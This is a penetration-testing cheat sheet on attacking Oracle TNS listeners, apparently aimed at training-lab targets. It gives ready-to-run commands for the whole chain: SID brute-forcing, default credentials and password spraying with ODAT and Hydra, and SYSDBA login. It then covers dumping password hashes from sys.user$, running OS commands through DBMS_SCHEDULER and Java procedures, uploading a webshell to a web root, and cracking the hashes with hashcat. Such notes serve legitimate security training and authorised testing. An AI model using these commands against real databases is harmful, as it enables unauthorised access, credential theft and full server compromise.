# Oracle TNS (Transparent Network Substrate)
**Default Ports:** 1521 (TCP) 
**Key Insight:** You cannot connect to an Oracle DB without knowing the **SID** (System ID) or **Service Name**. Enumerating the SID is step #1.
## 1. Theory: SID vs Service Name
| **Term**       | **Description**                         | **Importance**                                                      |
| -------------- | --------------------------------------- | ------------------------------------------------------------------- |
| *SID*          | System Identifier (e.g., `XE`, `ORCL`). | Unique ID for the specific instance. **Required** for legacy tools. |
| *Service Name* | Alias to one or more instances.         | Used by modern clients. Often the same as the SID.                  |
## 2. Discovery & SID Enumeration
**Goal:** Guess the SID (`XE`, `ORCL`, `HR`) to establish a connection.
### Nmap (Scripts)
**Description:** Brute-forces common SIDs. 
**Syntax:** `nmap -p 1521 --script oracle-sid-brute <IP>`
```shell
# ⚠️ OPSEC: Moderate Noise.
nmap -p 1521 -sV --script oracle-sid-brute 10.129.2.15
```
### ODAT (The Gold Standard)
**Install:** `sudo apt install odat` (or clone from GitHub) 
**Description:** Specialized tool for Oracle enumeration and exploitation. 
**Syntax:** `odat sidguesser -s <IP>`
```shell
# Brute force SIDs using a built-in list
odat sidguesser -s 10.129.2.15
```
## 3. Authentication & Brute Force
**Goal:** Once you have a valid SID (e.g., `XE`), find valid credentials.
### Default Credentials
- `system` : `manager`
- `scott` : `tiger`
- `dbsnmp` : `dbsnmp`
- `sys` : `change_on_install`
### ODAT Password Guesser
**Description:** Tries valid SIDs against a list of default Oracle credentials. 
**Syntax:** `odat passwordguesser -s <IP> -d <SID>`
```shell
# Test default creds against SID 'XE'
odat passwordguesser -s 10.129.2.15 -d XE
```
### Hydra (Custom Wordlists)
```shell
# Syntax: oracle-listener://<IP>/<SID>
hydra -L users.txt -P passwords.txt oracle-listener://10.129.2.15/XE
```
## 4. Manual Interaction (SQLPlus)
**Context:** You have valid credentials (`scott/tiger`). 
**Install:** Requires Oracle Instant Client (often painful to set up).

**Syntax:** `sqlplus <User>/<Pass>@<IP>/<SID>`

```shell
# Standard Connect
sqlplus scott/tiger@10.129.2.15/XE

# Connect as SYSDBA (God Mode)
# Required for high-privilege actions like dumping hashes.
sqlplus sys/change_on_install@10.129.2.15/XE as sysdba
```
### Enumeration Queries (Inside SQL)
```sql
-- List all tables
SELECT table_name FROM all_tables;

-- List All Users
SELECT username FROM all_users;

-- Check Current Privileges
SELECT * FROM user_role_privs;

-- Dump Hashes (Requires SYSDBA)
SELECT name, password FROM sys.user$;
```
## 5. Attacks: Remote Code Execution (RCE)
**Goal:** Execute OS commands on the server. 
**Tool:** `ODAT` (Automates multiple techniques: Java, Scheduler, External Tables).
### 1. Check Capabilities
```shell
# Tests all modules to see what is possible with your credentials
odat all -s 10.129.2.15 -d XE -U scott -P tiger
```
### 2. Execute Command
**Technique:** Tries to use the `DBMS_SCHEDULER` or `JAVA` stored procedures.
```shell
# Try to run 'whoami' via Scheduler
odat dbmsscheduler -s 10.129.2.15 -d XE -U scott -P tiger --sysdba --exec "whoami"

# Try via Java Stored Procedure
odat java -s 10.129.2.15 -d XE -U scott -P tiger --sysdba --exec "whoami"
```
## 6. Attacks: File Upload (Webshell)
**Goal:** Write a malicious file to a web directory (e.g., `C:\inetpub\wwwroot`). 
**Module:** `utlfile`
```shell
# Upload a local file (shell.aspx) to a remote path
# --putFile <Remote_Path> <Remote_Name> <Local_File>
odat utlfile -s 10.129.2.15 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot shell.aspx ./shell.aspx
```
## 7. Post-Exploitation (Hash Cracking)
**Context:** You dumped hashes from `sys.user$`.
- **Hashcat Mode 3100:** Oracle 7-10g (DES - Weak) 
- **Hashcat Mode 3200:** Oracle 11g (SHA1 - Medium)

```shell
hashcat -m 3100 oracle_hashes.txt rockyou.txt
```